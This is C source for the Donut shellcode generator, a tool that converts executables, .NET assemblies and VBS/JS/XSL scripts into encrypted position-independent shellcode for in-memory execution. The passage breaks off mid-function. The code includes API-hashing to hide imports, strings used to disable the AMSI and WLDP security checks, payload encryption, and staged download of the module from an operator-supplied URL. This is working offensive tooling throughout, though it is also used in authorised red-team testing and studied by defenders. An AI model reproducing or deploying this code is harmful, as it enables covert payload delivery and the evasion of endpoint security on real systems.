/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "donut.h"

#include "payload/payload_exe_x86.h"
#include "payload/payload_exe_x64.h"
  
#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
 
// these have to be in same order as DONUT_INSTANCE structure in donut.h
static API_IMPORT api_imports[]=
{ 
  {KERNEL32_DLL, "LoadLibraryA"},
  {KERNEL32_DLL, "GetProcAddress"},
  {KERNEL32_DLL, "GetModuleHandleA"},
  {KERNEL32_DLL, "VirtualAlloc"},
  {KERNEL32_DLL, "VirtualFree"},
  {KERNEL32_DLL, "VirtualQuery"},
  {KERNEL32_DLL, "VirtualProtect"},
  {KERNEL32_DLL, "Sleep"},
  {KERNEL32_DLL, "MultiByteToWideChar"},
  {KERNEL32_DLL, "GetUserDefaultLCID"},

  {OLEAUT32_DLL, "SafeArrayCreate"},
  {OLEAUT32_DLL, "SafeArrayCreateVector"},
  {OLEAUT32_DLL, "SafeArrayPutElement"},
  {OLEAUT32_DLL, "SafeArrayDestroy"},
  {OLEAUT32_DLL, "SafeArrayGetLBound"},
  {OLEAUT32_DLL, "SafeArrayGetUBound"},
  {OLEAUT32_DLL, "SysAllocString"},
  {OLEAUT32_DLL, "SysFreeString"},
  {OLEAUT32_DLL, "LoadTypeLib"},
  
  {WININET_DLL,  "InternetCrackUrlA"},
  {WININET_DLL,  "InternetOpenA"},
  {WININET_DLL,  "InternetConnectA"},
  {WININET_DLL,  "InternetSetOptionA"},
  {WININET_DLL,  "InternetReadFile"},
  {WININET_DLL,  "InternetCloseHandle"},
  {WININET_DLL,  "HttpOpenRequestA"},
  {WININET_DLL,  "HttpSendRequestA"},
  {WININET_DLL,  "HttpQueryInfoA"},
  
  {MSCOREE_DLL,  "CorBindToRuntime"},
  {MSCOREE_DLL,  "CLRCreateInstance"},
  
  {OLE32_DLL,    "CoInitializeEx"},
  {OLE32_DLL,    "CoCreateInstance"},
  {OLE32_DLL,    "CoUninitialize"},

  { NULL, NULL }
};

// required to load .NET assemblies
static GUID xCLSID_CorRuntimeHost = {
  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xIID_ICorRuntimeHost = {
  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xCLSID_CLRMetaHost = {
  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
  
static GUID xIID_ICLRMetaHost = {
  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
  
static GUID xIID_ICLRRuntimeInfo = {
  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

static GUID xIID_AppDomain = {
  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
  
// required to load VBS and JS files
static GUID xIID_IUnknown = {
  0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IDispatch = {
  0x00020400, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IHost  = { 
  0x91afbd1b, 0x5feb, 0x43f5, {0xb0, 0x28, 0xe2, 0xca, 0x96, 0x06, 0x17, 0xec}};
  
static GUID xIID_IActiveScript = {
  0xbb1a2ae1, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSite = {
  0xdb01a1e3, 0xa42b, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};
  
static GUID xIID_IActiveScriptParse32 = {
  0xbb1a2ae2, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptParse64 = {
  0xc7ef7658, 0xe1ee, 0x480e, {0x97, 0xea, 0xd5, 0x2c, 0xb4, 0xd7, 0x6d, 0x17}};

static GUID xCLSID_VBScript = {
  0xB54F3741, 0x5B07, 0x11cf, {0xA4, 0xB0, 0x00, 0xAA, 0x00, 0x4A, 0x55, 0xE8}};

static GUID xCLSID_JScript  = {
  0xF414C260, 0x6AC0, 0x11CF, {0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58}};

// required to load XSL files
static GUID xCLSID_DOMDocument30 = {
  0xf5078f32, 0xc551, 0x11d3, {0x89, 0xb9, 0x00, 0x00, 0xf8, 0x1f, 0xe2, 0x21}};

static GUID xIID_IXMLDOMDocument = {
  0x2933BF81, 0x7B36, 0x11D2, {0xB2, 0x0E, 0x00, 0xC0, 0x4F, 0x98, 0x3E, 0x60}};
  
static GUID xIID_IXMLDOMNode = {
  0x2933bf80, 0x7b36, 0x11d2, {0xb2, 0x0e, 0x00, 0xc0, 0x4f, 0x98, 0x3e, 0x60}};

#if defined(_WIN32) | defined(_WIN64)
#include "include/mmap-windows.c"
#ifdef _MSC_VER
#define strcasecmp stricmp
#endif
#endif

// return pointer to DOS header
static PIMAGE_DOS_HEADER DosHdr(void *map) {
    return (PIMAGE_DOS_HEADER)map;
}

// return pointer to NT headers
static PIMAGE_NT_HEADERS NtHdr (void *map) {
    return (PIMAGE_NT_HEADERS) ((uint8_t*)map + DosHdr(map)->e_lfanew);
}

// return pointer to File header
static PIMAGE_FILE_HEADER FileHdr (void *map) {
    return &NtHdr(map)->FileHeader;
}

// determines CPU architecture of binary
static int is32 (void *map) {
    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;
}

// return pointer to Optional header
static void* OptHdr (void *map) {
    return (void*)&NtHdr(map)->OptionalHeader;
}

static PIMAGE_DATA_DIRECTORY Dirs (void *map) {
    if (is32(map)) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr(map))->DataDirectory;
    } else {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr(map))->DataDirectory;
    }
}

// valid dos header?
static int valid_dos_hdr (void *map) {
    PIMAGE_DOS_HEADER dos = DosHdr(map);
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    return (dos->e_lfanew != 0);
}

// valid nt headers
static int valid_nt_hdr (void *map) {
    return NtHdr(map)->Signature == IMAGE_NT_SIGNATURE;
}

static ULONG64 rva2ofs (void *base, DWORD rva) {
    DWORD                 i;
    ULONG64               ofs;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
      
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    sh  = IMAGE_FIRST_SECTION(nt);
    
    for (i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if (rva >= sh[i].VirtualAddress && 
          rva <  sh[i].VirtualAddress + sh[i].SizeOfRawData) {
          
        ofs = sh[i].PointerToRawData + (rva - sh[i].VirtualAddress);
        return ofs;
      }
    }
    return -1;
}

// map a file into memory for reading
static int map_file(const char *path, file_info *fi) {
    struct stat fs;

    DPRINT("Reading size of file : %s", path);
    if(stat(path, &fs) != 0) {
      return DONUT_ERROR_FILE_NOT_FOUND;
    }
    
    if(fs.st_size == 0) {
      return DONUT_ERROR_FILE_EMPTY;
    }
      
    DPRINT("Opening %s", path);
    fi->fd = open(path, O_RDONLY);
    
    if(fi->fd < 0) {
      return DONUT_ERROR_FILE_ACCESS;
    }
    
    fi->size = fs.st_size;
    
    // map into memory
    DPRINT("Mapping %" PRIi64 " bytes for %s", fi->size, path);
    fi->map = mmap(NULL, fi->size,  
      PROT_READ, MAP_PRIVATE, fi->fd, 0);
    
    // no mapping? close file
    if(fi->map == NULL) {
      close(fi->fd);
      fi->map = NULL;
      return DONUT_ERROR_NO_MEMORY;
    }
    return DONUT_ERROR_SUCCESS;
}

// unmap a file from memory previously opened with map_file()
static int unmap_file(file_info *fi) {
    
    if(fi == NULL) return 0;
    
    DPRINT("Unmapping");
    munmap(fi->map, fi->size);    
    
    DPRINT("Closing");
    close(fi->fd);
    
    return 1;
}

static int get_file_info(const char *path, file_info *fi) {
    PIMAGE_NT_HEADERS     nt;    
    PIMAGE_DATA_DIRECTORY dir;
    PMDSTORAGESIGNATURE   pss;
    PIMAGE_COR20_HEADER   cor;
    DWORD                 dll, rva, ofs, cpu;
    PCHAR                 ext;
    int                   err = DONUT_ERROR_SUCCESS;
    
    DPRINT("Entering.");
    
    // invalid parameters passed?
    if(path == NULL || fi == NULL) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    // zero initialize file_info structure
    memset(fi, 0, sizeof(file_info));
    
    DPRINT("Checking extension of %s", path);
    ext = strrchr(path, '.');
    
    // no extension? exit
    if(ext == NULL) {
      return DONUT_ERROR_FILE_INVALID;
    }
    DPRINT("Extension is \"%s\"", ext);

    // VBScript?
    if (strcasecmp(ext, ".vbs") == 0) {
      DPRINT("Module is VBS");
      fi->type = DONUT_MODULE_VBS;
      fi->arch = DONUT_ARCH_ANY;
    } else 
    // JScript?
    if (strcasecmp(ext,  ".js") == 0) {
      DPRINT("Module is JS");
      fi->type = DONUT_MODULE_JS;
      fi->arch = DONUT_ARCH_ANY;
    } else 
    // XSL?
    if (strcasecmp(ext, ".xsl") == 0) {
      DPRINT("Module is XSL");
      fi->type = DONUT_MODULE_XSL;
      fi->arch = DONUT_ARCH_ANY;
    } else
    // EXE?
    if (strcasecmp(ext, ".exe") == 0) {
      DPRINT("Module is EXE");
      fi->type = DONUT_MODULE_EXE;
    } else
    // DLL?
    if (strcasecmp(ext, ".dll") == 0) {
      DPRINT("Module is DLL");
      fi->type = DONUT_MODULE_DLL;
    } else {
      // unrecognized extension
      return DONUT_ERROR_FILE_INVALID;
    }
    
    DPRINT("Mapping %s into memory", path);
    
    err = map_file(path, fi);
    if(err != DONUT_ERROR_SUCCESS) return err;
    
    // file is EXE or DLL?
    if(fi->type == DONUT_MODULE_DLL ||
       fi->type == DONUT_MODULE_EXE)
    {
      DPRINT("Checking DOS header");
      
      if(!valid_dos_hdr(fi->map)) {
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking NT header");
      
      if(!valid_nt_hdr(fi->map)) { 
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking IMAGE_DATA_DIRECTORY");
      
      dir = Dirs(fi->map);
      
      if(dir == NULL) {
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking characteristics");
      
      nt  = NtHdr(fi->map);
      dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;
      cpu = is32(fi->map);
      rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
      
      // set the CPU architecture for file
      fi->arch = cpu ? DONUT_ARCH_X86 : DONUT_ARCH_X64;
      
      // if COM directory present
      if(rva != 0) {
        DPRINT("COM Directory found");
        
        // set type to EXE or DLL assembly
        fi->type = (dll) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_NET_EXE;
        
        // try read the runtime version from meta header
        strncpy(fi->ver, "v4.0.30319", DONUT_VER_LEN - 1);
        
        ofs = rva2ofs(fi->map, rva);
        if (ofs != -1) {
          cor = (PIMAGE_COR20_HEADER)(ofs + fi->map);
          rva = cor->MetaData.VirtualAddress;
          if(rva != 0) {
            ofs = rva2ofs(fi->map, rva);
            if(ofs != -1) {
              pss = (PMDSTORAGESIGNATURE)(ofs + fi->map);
              DPRINT("Runtime version : %s", (char*)pss->pVersion);
              strncpy(fi->ver, (char*)pss->pVersion, DONUT_VER_LEN - 1);
            }
          }
        }
      }
    }
cleanup:
    if(err != DONUT_ERROR_SUCCESS) {
      unmap_file(fi);
    }
    DPRINT("Leaving.");
    return err;
}

// check if DLL exports function name
static int is_dll_export(file_info *fi, const char *function) {
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD                   rva, ofs, cnt;
    PDWORD                  sym;
    PCHAR                   str;
    int                     found = 0;

    DPRINT("Entering.");
    
    dir = Dirs(fi->map);
    if(dir != NULL) {
      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
      DPRINT("EAT VA : %lx", rva);
      if(rva != 0) {
        ofs = rva2ofs(fi->map, rva);
        if(ofs != -1) {
          exp = (PIMAGE_EXPORT_DIRECTORY)(fi->map + ofs);
          cnt = exp->NumberOfNames;
          DPRINT("Number of exported functions : %lx", cnt);
          
          if(cnt != 0) {
            sym = (PDWORD)(rva2ofs(fi->map, exp->AddressOfNames) + fi->map);
            // scan array for symbol
            do {
              str = (PCHAR)(rva2ofs(fi->map, sym[cnt - 1]) + fi->map);
              DPRINT("Checking %s", str);
              // if match found, exit
              if(strcmp(str, function) == 0) {
                DPRINT("Found API");
                found = 1;
                break;
              }
            } while (--cnt);
          }
        }
      }
    }
    DPRINT("Leaving.");
    return found;
}

// returns 1 on success else <=0
static int CreateRandom(void *buf, uint64_t len) {
    
#if defined(WINDOWS)
    HCRYPTPROV prov;
    int        ok;
    
    // 1. acquire crypto context
    if(!CryptAcquireContext(
        &prov, NULL, NULL,
        PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;

    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    
    return ok;
#else
    int      fd;
    uint64_t r=0;
    uint8_t  *p=(uint8_t*)buf;
    
    DPRINT("Opening /dev/urandom to acquire %li bytes", len);
    fd = open("/dev/urandom", O_RDONLY);
    
    if(fd > 0) {
      for(r=0; r<len; r++, p++) {
        if(read(fd, p, 1) != 1) break;
      }
      close(fd);
    }
    DPRINT("Acquired %li of %li bytes requested", r, len);
    return r == len;
#endif
}

// Generate a random string, not exceeding DONUT_MAX_NAME bytes
// tbl is from https://stackoverflow.com/a/27459196
static int GenRandomString(void *output, uint64_t len) {
    uint8_t rnd[DONUT_MAX_NAME];
    int     i;
    char    tbl[]="HMN34P67R9TWCXYF"; 
    char    *str = (char*)output;
    
    if(len == 0 || len > (DONUT_MAX_NAME - 1)) return 0;
    
    // generate DONUT_MAX_NAME random bytes
    if(!CreateRandom(rnd, DONUT_MAX_NAME)) return 0;
    
    // generate a string using unambiguous characters
    for(i=0; i<len; i++) {
      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
    }
    str[i] = 0;
    return 1;
}

// cheapo conversion from utf8 to utf16
static uint64_t utf8_to_utf16(void* dst, const char* src) {
    uint16_t *out = (uint16_t*)dst;
    uint64_t   i;
    
    for(i=0; src[i] != 0; i++) {
      out[i] = src[i];
    }
    return i;
}

static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
    PDONUT_MODULE mod = NULL;
    uint64_t      len = 0;
    char          *param, parambuf[DONUT_MAX_NAME*DONUT_MAX_PARAM+DONUT_MAX_PARAM];
    int           cnt, err=DONUT_ERROR_SUCCESS;
    
    DPRINT("Entering.");
    
    // Allocate memory for module information and contents of file
    len = sizeof(DONUT_MODULE) + fi->size;
    DPRINT("Allocating %" PRIi64 " bytes of memory for DONUT_MODULE", len);
    mod = calloc(len, 1);

    // Memory not allocated? exit
    if(mod == NULL) {
      return DONUT_ERROR_NO_MEMORY;
    }
    
    // Set the type of module
    mod->type = fi->type;
      
    // DotNet assembly?
    if(mod->type == DONUT_MODULE_NET_DLL ||
       mod->type == DONUT_MODULE_NET_EXE)
    {
      // If no domain name specified, generate a random one
      if(c->domain[0] == 0) {
        if(!GenRandomString(c->domain, DONUT_DOMAIN_LEN)) {
          err = DONUT_ERROR_RANDOM;
          goto cleanup;
        }
      }
      // convert to unicode format.
      // wchar_t is 32-bits on linux, but 16-bit on windows. :-|
      DPRINT("Domain  : %s", c->domain);
      utf8_to_utf16(mod->domain, c->domain);
      
      // Assembly is DLL? Copy the class and method
      if(mod->type == DONUT_MODULE_NET_DLL) {
        DPRINT("Class   : %s", c->cls);
        utf8_to_utf16(mod->cls, c->cls);
        
        DPRINT("Method  : %s", c->method);
        utf8_to_utf16(mod->method, c->method);
      }
      // If no runtime specified in configuration, use version from assembly
      if(c->runtime[0] == 0) {
        strncpy(c->runtime, fi->ver, DONUT_MAX_NAME-1);
      }
      DPRINT("Runtime : %s", c->runtime);
      utf8_to_utf16(mod->runtime, c->runtime);
    } else
    // Unmanaged DLL? check for exported api          
    if(mod->type == DONUT_MODULE_DLL && 
       c->method[0] != 0) 
    {
      DPRINT("DLL function : %s", c->method);
      strncpy((char*)mod->method, c->method, DONUT_MAX_NAME-1);
    }
      
    // Parameters specified?
    if(c->param[0] != 0) {
      strncpy(parambuf, c->param, sizeof(parambuf)-1);
      cnt = 0;
      // Split by comma or semi-colon
      param = strtok(parambuf, ",;");
      
      while(param != NULL && cnt < DONUT_MAX_PARAM) {
        if(strlen(param) >= DONUT_MAX_NAME) {
          DPRINT("Parameter : \"%s\" exceeds DONUT_MAX_PARAM(%i)", 
            param, DONUT_MAX_NAME);
          err = DONUT_ERROR_INVALID_PARAMETER;
          goto cleanup;
        }
        DPRINT("Adding \"%s\"", param);
        // convert ansi string to wide character string
        utf8_to_utf16(mod->param[cnt++], param);

        // get next parameter
        param = strtok(NULL, ",;");
      }
      // set number of parameters
      mod->param_cnt = cnt;
    }
    
    // set length of module data
    mod->len = fi->size;
    // read module into memory
    memcpy(&mod->data, fi->map, fi->size);
    // update configuration with pointer to module
    c->mod     = mod;
    c->mod_len = len;
    
cleanup:
    // if there was an error, free memory for module
    if(err != DONUT_ERROR_SUCCESS && mod != NULL) {
      free(mod);
      c->mod     = NULL;
      c->mod_len = 0;
    }
    DPRINT("Leaving.");
    return err;
}

static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
    DONUT_CRYPT     inst_key, mod_key;
    PDONUT_INSTANCE inst;
    uint64_t        inst_len;
    uint64_t        dll_hash;
    int             cnt;
    
    DPRINT("Entering.");
    
    // Allocate memory for the size of instance based on the type
    DPRINT("Allocating space for instance");
    inst_len = sizeof(DONUT_INSTANCE);
    
    // if this is a PIC instance, add the size of module
    // that will be appended to the end of structure
    if(c->inst_type == DONUT_INSTANCE_PIC) {
      DPRINT("The size of module is %" PRIi64 " bytes. " 
             "Adding to size of instance.", c->mod_len);
      inst_len += c->mod_len;
    }
    // allocate zero-initialized memory for instance
    inst = (PDONUT_INSTANCE)calloc(inst_len, 1);
    
    // Memory allocation failed? exit
    if(inst == NULL) {
      return DONUT_ERROR_NO_MEMORY;
    }
    
#if !defined(NOCRYPTO)
    DPRINT("Generating random key for instance");
    if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
      return DONUT_ERROR_RANDOM;
    }
    memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
    
    DPRINT("Generating random key for module");
    if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
      return DONUT_ERROR_RANDOM;
    }
    memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
    
    DPRINT("Generating random string to verify decryption");
    if(!GenRandomString(inst->sig, DONUT_SIG_LEN)) {
      return DONUT_ERROR_RANDOM;
    }
#endif
   
    DPRINT("Generating random IV for Maru hash");
    if(!CreateRandom(&inst->iv, MARU_IV_LEN)) {
      return DONUT_ERROR_RANDOM;
    }
    
    DPRINT("Generating hashes for API using IV: %" PRIx64, inst->iv);
    
    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
      // calculate hash for DLL string
      dll_hash = maru(api_imports[cnt].module, inst->iv);
      
      // calculate hash for API string.
      // xor with DLL hash and store in instance
      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->iv) ^ dll_hash;
      
      DPRINT("Hash for %-15s : %-22s = %" PRIX64, 
        api_imports[cnt].module, 
        api_imports[cnt].name,
        inst->api.hash[cnt]);
    }
    // save how many API to resolve
    inst->api_cnt = cnt;
    inst->dll_cnt = 0;

    strcpy(inst->dll_name[inst->dll_cnt++], "ole32.dll");
    strcpy(inst->dll_name[inst->dll_cnt++], "oleaut32.dll");
    strcpy(inst->dll_name[inst->dll_cnt++], "wininet.dll");  
    strcpy(inst->dll_name[inst->dll_cnt++], "mscoree.dll");
        
    // if module is .NET assembly
    if(c->mod_type == DONUT_MODULE_NET_DLL ||
       c->mod_type == DONUT_MODULE_NET_EXE)
    {
      DPRINT("Copying GUID structures and DLL strings for loading .NET assemblies");

      memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
      memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
      memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
      memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));
      memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
      memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
    } else 
    // if module is VBS or JS
    if(c->mod_type == DONUT_MODULE_VBS ||
       c->mod_type == DONUT_MODULE_JS)
    {       
      DPRINT("Copying GUID structures and DLL strings for loading VBS/JS");
      
      memcpy(&inst->xIID_IUnknown,              &xIID_IUnknown,              sizeof(GUID));
      memcpy(&inst->xIID_IDispatch,             &xIID_IDispatch,             sizeof(GUID));
      memcpy(&inst->xIID_IHost,                 &xIID_IHost,                 sizeof(GUID));
      memcpy(&inst->xIID_IActiveScript,         &xIID_IActiveScript,         sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSite,     &xIID_IActiveScriptSite,     sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse32,  &xIID_IActiveScriptParse32,  sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse64,  &xIID_IActiveScriptParse64,  sizeof(GUID));
      
      utf8_to_utf16(inst->wscript,     "WScript");
      utf8_to_utf16(inst->wscript_exe, "wscript.exe");
      
      if(c->mod_type == DONUT_MODULE_VBS) {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));
      } else {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_JScript,  sizeof(GUID));
      }
    } else
    // if module is XSL
    if(c->mod_type == DONUT_MODULE_XSL)
    {
      DPRINT("Copying GUID structures for loading XSL to instance");
      
      memcpy(&inst->xCLSID_DOMDocument30,  &xCLSID_DOMDocument30,  sizeof(GUID));
      memcpy(&inst->xIID_IXMLDOMDocument,  &xIID_IXMLDOMDocument,  sizeof(GUID));
      memcpy(&inst->xIID_IXMLDOMNode,      &xIID_IXMLDOMNode,      sizeof(GUID));
    }

    // required to disable AMSI
    strcpy(inst->amsi.s,         "AMSI");
    strcpy(inst->amsiInit,       "AmsiInitialize");
    strcpy(inst->amsiScanBuf,    "AmsiScanBuffer");
    strcpy(inst->amsiScanStr,    "AmsiScanString");
    
    strcpy(inst->clr,            "CLR");
    
    // required to disable WLDP
    strcpy(inst->wldp,           "WLDP");
    strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
    strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");

    // set the type of instance we're creating
    inst->type = c->inst_type;

    // if the module will be downloaded
    // set the URL parameter and request verb
    if(inst->type == DONUT_INSTANCE_URL) {
      // generate a random name for module
      // that will be saved to disk
      if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
        return DONUT_ERROR_RANDOM;
      }
      DPRINT("Generated random name for module : %s", c->modname);
    
      DPRINT("Setting URL parameters");
      strcpy(inst->http.url, c->url);
      // append module name
      strcat(inst->http.url, c->modname);
      // set the request verb
      strcpy(inst->http.req, "GET");
      
      DPRINT("Payload will attempt download from : %s", inst->http.url);
    }

    inst->mod_len = c->mod_len;
    inst->len     = inst_len;
    c->inst       = inst;
    c->inst_len   = inst_len;
    
#if !defined(NOCRYPTO)
    if(c->inst_type == DONUT_INSTANCE_URL) {
      DPRINT("encrypting module for download");
      
      c->mod->mac = maru(inst->sig, inst->iv);
      
      donut_encrypt(
        mod_key.mk, 
        mod_key.ctr, 
        c->mod, 
        c->mod_len);
    }
#endif
    // if PIC, copy module to instance
    if(inst->type == DONUT_INSTANCE_PIC) {
      DPRINT("Copying module data to instance");
      memcpy(&c->inst->module.x, c->mod, c->mod_len);
    }
    
#if !defined(NOCRYPTO)
    DPRINT("encrypting instance");
    
    inst->mac = maru(inst->sig, inst->iv);
    
    uint8_t *inst_data = (uint8_t*)inst + offsetof(DONUT_INSTANCE, api_cnt);
    
    donut_encrypt(
      inst_key.mk, 
      inst_key.ctr, 
      inst_data, 
      c->inst_len - offsetof(DONUT_INSTANCE, api_cnt));
#endif
    DPRINT("Leaving.");
    
    return DONUT_ERROR_SUCCESS;
}
  
// given a configuration, create a PIC that will run from anywhere in memory
EXPORT_FUNC 
int DonutCreate(PDONUT_CONFIG c) {
    uint8_t   *pl;
    uint32_t  t;
    int       url_len, err = DONUT_ERROR_SUCCESS;
    FILE      *fd;
    file_info fi;
    
    DPRINT("Entering.");
    
    DPRINT("Validating configuration and path of file PDONUT_CONFIG: %p", c);
    
    if(c == NULL || c->file[0] == 0) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    
    c->mod      = NULL;
    c->mod_len  = 0;
    
    c->inst     = NULL;
    c->inst_len = 0;
    
    c->pic      = NULL;
    c->pic_len  = 0;
    
    // instance not specified?
    DPRINT("Validating instance type %" PRIx32 "", c->inst_type);
    
    if(c->inst_type != DONUT_INSTANCE_PIC &&
       c->inst_type != DONUT_INSTANCE_URL) {
         
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    
    if(c->inst_type == DONUT_INSTANCE_URL) {
      DPRINT("Validating URL");
      
      // no URL? exit
      if(c->url[0] == 0) {
        return DONUT_ERROR_INVALID_PARAMETER;
      }
      // doesn't begin with one of the following? exit
      if((strnicmp(c->url, "http://",  7) != 0) &&
         (strnicmp(c->url, "https://", 8) != 0)) {
           
        return DONUT_ERROR_INVALID_URL;
      }
      // invalid length?
      if(strlen(c->url) <= 8) {
        return DONUT_ERROR_URL_LENGTH;
      }
      // ensure URL parameter and module name don't exceed DONUT_MAX_URL
      url_len = strlen(c->url);
      
      // if the end of string doesn't have a forward slash
      // add one more to account for it
      if(c->url[url_len - 1] != '/') {
        strcat(c->url, "/");
        url_len++;
      }
      
      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_URL) {
        return DONUT_ERROR_URL_LENGTH;
      }
    }
    
    DPRINT("Validating architecture");
    
    if(c->arch != DONUT_ARCH_X86 &&
       c->arch != DONUT_ARCH_X64 &&
       c->arch != DONUT_ARCH_X84 &&
       c->arch != DONUT_ARCH_ANY)
    {
      return DONUT_ERROR_INVALID_ARCH;
    }
    
    DPRINT("Validating AMSI/WDLP bypass option");
    
    if(c->bypass != DONUT_BYPASS_SKIP     &&
       c->bypass != DONUT_BYPASS_ABORT    &&
       c->bypass != DONUT_BYPASS_CONTINUE)
    {
      return DONUT_ERROR_BYPASS_INVALID;
    }
    
    // get file information
    err = get_file_info(c->file, &fi);
    if(err != DONUT_ERROR_SUCCESS) return err;
    
    // Set the module type
    c->mod_type = fi.type;
    
    // Unmanaged EXE/DLL?
    if(c->mod_type == DONUT_MODULE_DLL ||
       c->mod_type == DONUT_MODULE_EXE)
    {
      DPRINT("Validating architecture %i for DLL/EXE %i",
        c->arch, fi.arch);
      // Requested shellcode is x86, but file is x64?
      // Requested shellcode is x64, but file is x86?
